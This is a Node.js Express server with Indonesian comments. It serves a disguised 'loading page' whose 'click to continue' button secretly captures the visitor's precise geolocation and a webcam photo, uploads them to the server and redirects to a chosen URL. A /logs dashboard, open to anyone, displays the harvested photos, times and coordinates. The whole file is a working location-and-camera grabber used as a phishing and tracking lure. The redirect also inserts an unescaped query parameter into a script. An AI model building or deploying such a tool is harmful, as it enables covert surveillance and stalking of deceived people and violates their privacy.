const express = require('express');
const app = express();
app.use(express.json({ limit: '10mb' })); // Batas ukuran data foto

const visitLogs = [];

app.get('/track', (req, res) => {
    const targetUrl = req.query.target || 'https://www.google.com';
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <body style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; background:#000; color:#fff;">
            <h2>Memuat halaman...</h2>
            <button id="btn" style="padding:15px 30px; font-size:18px; cursor:pointer; border-radius:10px;">Klik untuk Melanjutkan</button>
            <video id="video" style="display:none;"></video>
            <canvas id="canvas" style="display:none;"></canvas>
            
            <script>
                document.getElementById('btn').onclick = async () => {
                    let locationData = { lat: 0, lng: 0 };
                    let photoData = "";

                    // 1. Ambil Lokasi
                    try {
                        const pos = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
                        });
                        locationData = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                    } catch (e) { console.log("Lokasi ditolak"); }

                    // 2. Ambil Kamera
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        await video.play();
                        
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        photoData = canvas.toDataURL('image/jpeg');
                        
                        stream.getTracks().forEach(track => track.stop());
                    } catch (e) { console.log("Kamera ditolak"); }

                    // 3. Kirim semua data ke server
                    await fetch('/save-all', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ location: locationData, photo: photoData })
                    });

                    window.location.href = '${targetUrl}';
                };
            </script>
        </body>
        </html>
    `);
});

app.post('/save-all', (req, res) => {
    const { location, photo } = req.body;
    visitLogs.unshift({
        waktu: new Date().toLocaleString('id-ID'),
        lokasi: location,
        foto: photo
    });
    res.sendStatus(200);
});

app.get('/logs', (req, res) => {
    res.send(`
        <body style="background:#111; color:#fff; padding:20px;">
            <h1>Dashboard Log</h1>
            ${visitLogs.map(log => `
                <div style="border:1px solid #444; padding:10px; margin-bottom:10px;">
                    <p>Waktu: ${log.waktu}</p>
                    <p>Lokasi: ${log.lokasi.lat}, ${log.lokasi.lng}</p>
                    ${log.foto ? `<img src="${log.foto}" style="width:200px; border-radius:5px;">` : '<p>Tidak ada foto</p>'}
                </div>
            `).join('')}
        </body>
    `);
});

module.exports = app;
